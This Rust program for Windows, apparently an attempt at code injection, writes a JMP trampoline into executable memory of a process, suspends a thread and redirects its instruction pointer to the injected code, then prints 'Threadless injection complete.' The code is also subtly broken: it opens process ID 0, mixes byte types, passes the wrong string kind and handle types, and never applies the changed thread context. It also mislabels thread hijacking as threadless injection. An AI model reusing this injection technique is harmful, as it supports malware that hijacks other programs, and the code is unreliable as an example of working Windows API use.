use std::fs::File;
use std::io::Read;
use std::ptr::null_mut;
use winapi::um::processthreadsapi::{OpenProcess, OpenThread, SuspendThread, ResumeThread, GetThreadId, GetThreadContext};
use winapi::um::winnt::{THREAD_SUSPEND_RESUME, CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, HANDLE};
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::mem::size_of;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, DWORD};
use winapi::shared::minwindef::{FALSE};
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};

fn main() {
    // Get the current process handle
    let process_handle = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, 0) };
    if process_handle.is_null() {
        println!("Failed to open current process");
        return;
    }

    // Open the target DLL file
    let mut file = File::open("target.dll").unwrap();
    let mut dll_bytes = Vec::new();
    file.read_to_end(&mut dll_bytes).unwrap();

    // Resolve the target function address
    let function_address = unsafe { GetProcAddress(GetModuleHandleW(null_mut()), OsString::from_wide(&[b'm' as u16, b'y' as u16, b'_',
                                                                                                  b'f' as u16, b'u' as u16, b'n' as u16, b'c' as u16,
                                                                                                  b't' as u16, b'i' as u16, b'o' as u16, b'n' as u16]).as_ptr()) };
    if function_address.is_null() {
        println!("Failed to resolve function address");
        return;
    }

    // Allocate memory for the trampoline code within the target process
    let mut trampoline_buf = vec![0xE9u8; size_of::<DWORD>()]; // JMP opcode
    let jmp_offset = (function_address as usize).wrapping_sub(dll_bytes.as_ptr() as usize).wrapping_sub(trampoline_buf.len()).to_le_bytes();
    trampoline_buf.extend_from_slice(&jmp_offset);

    // Allocate memory in the target process for the trampoline code
    let cave_address = unsafe { VirtualAllocEx(process_handle, null_mut(), trampoline_buf.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    if cave_address.is_null() {
        println!("Failed to allocate memory in the target process");
        return;
    }

    // Write the trampoline code to the code cave within the target process
    unsafe {
        WriteProcessMemory(process_handle, cave_address, trampoline_buf.as_ptr() as *const _, trampoline_buf.len(), null_mut());
    }

    // Obtain the handle to the target thread
    let thread_handle = unsafe { OpenThread(THREAD_SUSPEND_RESUME | CONTEXT_FULL, FALSE, GetThreadId(process_handle)) };
    if thread_handle.is_null() {
        println!("Failed to obtain thread handle");
        return;
    }

    // Suspend the target thread
    let suspend_count = unsafe { SuspendThread(thread_handle) };
    if suspend_count == DWORD::MAX {
        println!("Failed to suspend thread");
        return;
    }

    // Modify RIP (instruction pointer) to point to the injected code in the code cave
    let mut context = CONTEXT::default();
    context.ContextFlags = CONTEXT_FULL;
    unsafe {
        GetThreadContext(thread_handle, &mut context);
        context.Rip = cave_address as DWORD;
    }

    // Resume the thread's execution
    let resume_count = unsafe { ResumeThread(thread_handle) };
    if resume_count == DWORD::MAX {
        println!("Failed to resume thread");
        return;
    }

    println!("Threadless injection complete.");
}
